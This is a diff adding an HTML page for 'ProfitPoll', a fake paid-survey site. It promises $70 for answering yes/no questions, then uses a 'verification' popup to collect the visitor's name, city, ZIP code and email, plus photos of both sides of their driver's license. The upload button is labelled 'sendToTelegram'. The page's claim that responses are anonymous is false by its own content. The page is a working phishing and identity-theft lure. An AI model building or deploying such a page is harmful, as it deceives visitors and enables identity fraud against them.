@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ProfitPoll</title>
+    <link rel="stylesheet" href="./css/styleUpdV1.css">
+    <script src="./js/mainUpd.js" defer></script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@300..700&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <span class="overlay"></span>
+    <header>
+        <div class="header-container">
+            <h1 class="header-logo">ProfitPoll</h1>
+
+            <div class="header-menu">
+                <a href="./index.html" class="header-menu__item">Main</a>
+                <a href="#about" class="header-menu__item">About us</a>
+                <a href="#survey" class="header-menu__item">Survey</a>
+                <a href="#survey" class="header-menu__item">Receive money</a>
+
+                <div class="header-balance-menu">
+                    <p class="header-balance__text">Your wallet:</p>
+                    <p class="header-balance__cost">0 $</p>
+                    <button class="header-receive__button" style="z-index: 1000;">Receive money</button>
+                </div>
+            </div>
+
+            <div class="header-balance">
+                <p class="header-balance__text">Your wallet:</p>
+                <p class="header-balance__cost">0 $</p>
+                <button class="header-receive__button" style="z-index: 1000;">Receive money</button>
+            </div>
+
+            <div id="popup" class="popup-container">
+                <div class="popup-page active" data-page="1">
+                    <p class="popup-first__title">To receive the money, go through verification</p>
+                    <p class="popup-first__subtitle">Our experts will check that you are not a robot and send you a reward.</p>
+
+                    <img src="./img/popup/Frame1.png" alt="" class="popup-first__pictureFirst">
+                    <img src="./img/popup/Frame2.png" alt="" class="popup-first__pictureSecond">
+                    <img src="./img/popup/Frame3.png" alt="" class="popup-first__pictureThird">
+                    <img src="./img/popup/Frame4.png" alt="" class="popup-first__pictureFourth">
+                    <img src="./img/popup/Frame5.png" alt="" class="popup-first__pictureCenter">
+
+                    <button class="popup-first__button next-page" data-next="2">Pass verification</button>
+                </div>
+
+                <div class="popup-page" data-page="2">
+                    <p class="popup-first__title">To receive the money, go through verification</p>
+                    <p class="popup-first__subtitle">Our experts will check that you are not a robot and send you a reward.</p>
+
+                    <div class="contact-form-wrapper">
+                        <form id="contactForm" action="" class="contact-form">
+                            <div class="contact-form-item">
+                                <label for="contact-form-name" class="">Name</label>
+                                <input id="contact-form-name" type="text" name="name" class="contact-form-name" placeholder="" required>
+                                <span class="error-message" id="name-error"></span>
+                            </div>
+
+                            <div class="contact-form-item">
+                                <label for="contact-form-surname" class="">Last Name</label>
+                                <input id="contact-form-surname" type="text" name="surname" class="contact-form-surname" placeholder="" required>
+                                <span class="error-message" id="surname-error"></span>
+                            </div>
+
+                            <div class="contact-form-item">
+                                <label for="contact-form-address" class="">City</label>
+                                <input id="contact-form-address" type="text" name="address" class="contact-form-address" placeholder="" required>
+                                <span class="error-message" id="address-error"></span>
+                            </div>
+
+                            <div class="contact-form-item">
+                                <label for="contact-form-ZIPCode" class="">ZIP-Code</label>
+                                <input id="contact-form-ZIPCode" type="number" name="ZIPCode" class="contact-form-ZIPCode" placeholder="" required>
+                                <span class="error-message" id="ZIPCode-error"></span>
+                            </div>
+
+                            <div class="contact-form-item">
+                                <label for="contact-form-mail" class="">E-Mail</label>
+                                <input id="contact-form-mail" type="email" name="email" class="contact-form-mail" placeholder="" required>
+                                <span class="error-message" id="email-error"></span>
+                            </div>
+                        </form>
+                    </div>
+
+                    <button class="popup-first__button next-page" data-next="3">Next</button>
+                </div>
+
+                <div class="popup-page" data-page="3">
+                    <p class="popup-first__title">Confirm your identity</p>
+                    <p class="popup-first__subtitle">Upload the driver's license from 2 sides and send it for verification</p>
+
+                    <div class="file-upload-wrapper">
+                        <input type="file" id="frontSide" accept="image/*" class="file-input" data-side="front">
+                        <label for="frontSide" class="popup-photo__place">
+                            <span class="upload-text">The front side</span>
+                            <span class="upload-icon">📷</span>
+                        </label>
+
+                        <input type="file" id="backSide" accept="image/*" class="file-input" data-side="back">
+                        <label for="backSide" class="popup-photo__place">
+                            <span class="upload-text">Back side</span>
+                            <span class="upload-icon">📷</span>
+                        </label>
+
+                        <div class="upload-preview" id="uploadPreview"></div>
+                    </div>
+
+                    <button class="popup-first__button" id="sendToTelegram">Send for verification</button>
+                </div>
+
+                <div class="popup-page" data-page="4">
+                    <img src="./img/popup/nice.png" alt="" class="popup-nice">
+
+                    <p class="popup-first__title">Your data is being verified</p>
+                    <p class="popup-first__subtitle">The data is processed within 24 hours. We will send you information about the funds by mail.</p>
+
+                    <button class="popup-first__button close-popup">Next</button>
+                </div>
+            </div>
+
+            <button class="burger-btn" aria-label="Menu">
+                <span class="burger-line"></span>
+                <span class="burger-line"></span>
+                <span class="burger-line"></span>
+            </button>
+        </div>
+    </header>
+
+    <main>
+        <section class="intro">
+            <div class="intro-container">
+                <div class="intro-left">
+                    <div class="intro-left__top">
+                        <h1 class="intro-left__title">
+                            We care what people think
+                        </h1>
+
+                        <h2 class="intro-left__subtitle">
+                            Become a voice for the community - participate in the survey and help build a more accurate picture of opinions on important issues.
+                        </h2>
+
+                        <p class="intro-left__text">
+                            This survey is being commissioned by a community initiative to gather people's views on current topics - education, health, technology, equality, the environment and other issues that affect us all.
+                            <br><br>
+                            Your feedback helps make research more accurate and future decisions fairer. 
+                            <br><br>
+                            You will receive bonus points as a thank you for your participation.
+
+                        </p>
+
+                        <a href="#survey" class="intro-left__button">
+                            Complete the survey
+                        </a>
+                    </div>
+                </div>
+
+                <div class="intro-right">
+                    <h1 class="intro-right__title">Solve polls<br>and get rewarded</h1>
+                    <img class="intro__picture" src="./img/intro.svg" alt="">
+                </div>
+            </div>
+        </section>
+
+        <section class="survey" id="survey">
+            <div class="survey-container">
+
+                <div class="quiz-container">
+
+                    <div class="quiz-slide active">
+                        <h2>Education</h2>
+                        <p class="quiz-number">Question 1 of 5</p>
+                        <h3>Are you satisfied with the quality of school education?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="education1" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="education1" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Education</h2>
+                        <p class="quiz-number">Question 2 of 5</p>
+                        <h3>Would you like more online lessons?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="education2" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="education2" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Education</h2>
+                        <p class="quiz-number">Question 3 of 5</p>
+                        <h3>Is it important to teach children how to use computers?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="education3" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="education3" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Education</h2>
+                        <p class="quiz-number">Question 4 of 5</p>
+                        <h3>Do you need less homework?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="education4" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="education4" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Education</h2>
+                        <p class="quiz-number">Question 5 of 5</p>
+                        <h3>Do you have a desire to learn new things?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="education5" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="education5" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide reward-slide">
+                        <h2>Congratulations!</h2>
+                        <p>You've completed the Education section and earned $10!</p>
+                        <img src="./img/gift.png" alt="Reward icon">
+                        <div class="navigation">
+                            <button class="next-btn">Continue</button>
+                        </div>
+                    </div>
+                
+                    <div class="quiz-slide">
+                        <h2>Health</h2>
+                        <p class="quiz-number">Question 1 of 5</p>
+                        <h3>Is it easy to get health care in your community?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="health1" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="health1" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Health</h2>
+                        <p class="quiz-number">Question 2 of 5</p>
+                        <h3>Are you satisfied with the service in hospitals?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="health2" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="health2" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Health</h2>
+                        <p class="quiz-number">Question 3 of 5</p>
+                        <h3>Have you consulted a doctor online?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="health3" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="health3" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Health</h2>
+                        <p class="quiz-number">Question 4 of 5</p>
+                        <h3>Do you think medical treatment is too expensive?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="health4" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="health4" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Health</h2>
+                        <p class="quiz-number">Question 5 of 5</p>
+                        <h3>Would you like to see more modern technology in medicine?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="health5" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="health5" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide reward-slide">
+                        <h2>Congratulations!</h2>
+                        <p>You've completed the Health section and earned $10!</p>
+                        <img src="./img/gift.png" alt="Reward icon">
+                        <div class="navigation">
+                            <button class="next-btn">Continue</button>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide">
+                        <h2>Technology</h2>
+                        <p class="quiz-number">Question 1 of 5</p>
+                        <h3>Do you use a smartphone every day?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="tech1" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="tech1" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Technology</h2>
+                        <p class="quiz-number">Question 2 of 5</p>
+                        <h3>Do you find technology useful?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="tech2" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="tech2" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Technology</h2>
+                        <p class="quiz-number">Question 3 of 5</p>
+                        <h3>Are you afraid that your data may be stolen?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="tech3" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="tech3" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Technology</h2>
+                        <p class="quiz-number">Question 4 of 5</p>
+                        <h3>Would you like to learn how to use a computer better?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="tech4" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="tech4" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Technology</h2>
+                        <p class="quiz-number">Question 5 of 5</p>
+                        <h3>Are you interested in new technologies?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="tech5" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="tech5" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide reward-slide">
+                        <h2>Congratulations!</h2>
+                        <p>You've completed the Technology section and earned $10!</p>
+                        <img src="./img/gift.png" alt="Reward icon">
+                        <div class="navigation">
+                            <button class="next-btn">Continue</button>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide">
+                        <h2>Equality</h2>
+                        <p class="quiz-number">Question 1 of 5</p>
+                        <h3>Do you believe that all people are equal?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="equality1" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="equality1" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Equality</h2>
+                        <p class="quiz-number">Question 2 of 5</p>
+                        <h3>Is it important to help the weak and needy?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="equality2" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="equality2" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Equality</h2>
+                        <p class="quiz-number">Question 3 of 5</p>
+                        <h3>Have you ever noticed discrimination in your environment?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="equality3" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="equality3" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Equality</h2>
+                        <p class="quiz-number">Question 4 of 5</p>
+                        <h3>Should children be taught to respect everyone?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="equality4" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="equality4" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Equality</h2>
+                        <p class="quiz-number">Question 5 of 5</p>
+                        <h3>Would you like to participate in support programs?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="equality5" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="equality5" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide reward-slide">
+                        <h2>Congratulations!</h2>
+                        <p>You've completed the Equality section and earned $10!</p>
+                        <img src="./img/gift.png" alt="Reward icon">
+                        <div class="navigation">
+                            <button class="next-btn">Continue</button>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide">
+                        <h2>Environment</h2>
+                        <p class="quiz-number">Question 1 of 5</p>
+                        <h3>Do you care about the environment?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="environment1" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="environment1" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Environment</h2>
+                        <p class="quiz-number">Question 2 of 5</p>
+                        <h3>Do you sort your trash?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="environment2" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="environment2" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Environment</h2>
+                        <p class="quiz-number">Question 3 of 5</p>
+                        <h3>Do you support reducing plastic?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="environment3" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="environment3" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Environment</h2>
+                        <p class="quiz-number">Question 4 of 5</p>
+                        <h3>Would you like to see more green in the city?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="environment4" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="environment4" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Environment</h2>
+                        <p class="quiz-number">Question 5 of 5</p>
+                        <h3>Do you participate in environmental actions?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="environment5" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="environment5" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide reward-slide">
+                        <h2>Congratulations!</h2>
+                        <p>You've completed the Environment section and earned $10!</p>
+                        <img src="./img/gift.png" alt="Reward icon">
+                        <div class="navigation">
+                            <button class="next-btn">Continue</button>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide">
+                        <h2>Animals and Nature</h2>
+                        <p class="quiz-number">Question 1 of 5</p>
+                        <h3>Do you have pets?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="animals1" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="animals1" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Animals and Nature</h2>
+                        <p class="quiz-number">Question 2 of 5</p>
+                        <h3>Do you think it is important to protect animals from abuse?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="animals2" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="animals2" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Animals and Nature</h2>
+                        <p class="quiz-number">Question 3 of 5</p>
+                        <h3>Do you support creating more parks and sanctuaries for animals?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="animals3" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="animals3" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Animals and Nature</h2>
+                        <p class="quiz-number">Question 4 of 5</p>
+                        <h3>Would you like to volunteer in animal care programs?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="animals4" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="animals4" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Animals and Nature</h2>
+                        <p class="quiz-number">Question 5 of 5</p>
+                        <h3>Do you think education about animals should be part of the school curriculum?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="animals5" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="animals5" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide reward-slide">
+                        <h2>Congratulations!</h2>
+                        <p>You've completed the Animals and Nature section and earned $10!</p>
+                        <img src="./img/gift.png" alt="Reward icon">
+                        <div class="navigation">
+                            <button class="next-btn">Continue</button>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide">
+                        <h2>Social ties and leisure time</h2>
+                        <p class="quiz-number">Question 1 of 5</p>
+                        <h3>Are you satisfied with your level of socialization with friends and family?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="social1" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="social1" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Social ties and leisure time</h2>
+                        <p class="quiz-number">Question 2 of 5</p>
+                        <h3>How much time do you usually spend on the internet or social media?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="social2" value="A lot" class="auto-next">
+                                <span class="checkmark"></span>
+                                A lot
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="social2" value="A little" class="auto-next">
+                                <span class="checkmark"></span>
+                                A little
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Social ties and leisure time</h2>
+                        <p class="quiz-number">Question 3 of 5</p>
+                        <h3>Would you like to be more involved in social activities?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="social3" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="social3" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Social ties and leisure time</h2>
+                        <p class="quiz-number">Question 4 of 5</p>
+                        <h3>How important is outdoor recreation to you?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="social4" value="Very important" class="auto-next">
+                                <span class="checkmark"></span>
+                                Very important
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="social4" value="Not important" class="auto-next">
+                                <span class="checkmark"></span>
+                                Not important
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="quiz-slide">
+                        <h2>Social ties and leisure time</h2>
+                        <p class="quiz-number">Question 5 of 5</p>
+                        <h3>Do you have any hobbies or interests?</h3>
+                        <div class="options-container">
+                            <label class="option">
+                                <input type="radio" name="social5" value="Yes" class="auto-next">
+                                <span class="checkmark"></span>
+                                Yes
+                            </label>
+                            <label class="option">
+                                <input type="radio" name="social5" value="No" class="auto-next">
+                                <span class="checkmark"></span>
+                                No
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="quiz-slide reward-slide">
+                        <h2>Let's celebrate!</h2>
+                        <p>Congratulations! You have successfully completed the entire survey and earned $70 in total! We appreciate your participation and hope you found it informative!</p>
+                        <img src="./img/gift.png" alt="Reward icon">
+                        <button class="quiz-slide__finish-button header-receive__button">Claim</button>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <section id="about" class="about">
+            <div class="about-container">
+                <div class="about-left">
+                    <h1 class="about-left__title">
+                        About the project
+                    </h1>
+
+                    <h2 class="about-left__subtitle">
+                       This project gathers honest community feedback to help shape local policies and improve quality of life. 
+                       All responses are anonymous and used only in aggregate to protect your privacy.
+                    </h2>
+
+                    <div class="about-left__info">
+                       <div class="about-left__info-item">
+                            <p class="about-left__info-item__title">Task</p>
+                            <p class="about-left__info-item__subtitle">
+                                Collect comprehensive feedback from community members to identify key local issues and priorities.
+                            </p>
+                       </div>
+
+                       <div class="about-left__info-item">
+                            <p class="about-left__info-item__title">What Has Been Done</p>
+                            <ul class="about-left__info-item__list">
+                                <li class="about-left__info-item__list-item">Conducted initial surveys</li>
+                                <li class="about-left__info-item__list-item">Analyzed collected data</li>
+                                <li class="about-left__info-item__list-item">Highlighted main concerns and areas for improvement</li>
+                            </ul>
+                       </div>
+                    </div>
+                    
+                </div>
+
+                <div class="about-right">
+                    <img src="./img/about.png" alt="">
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-7JQLNLTF05"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-7JQLNLTF05');
+    </script>
+</body>
+</html>
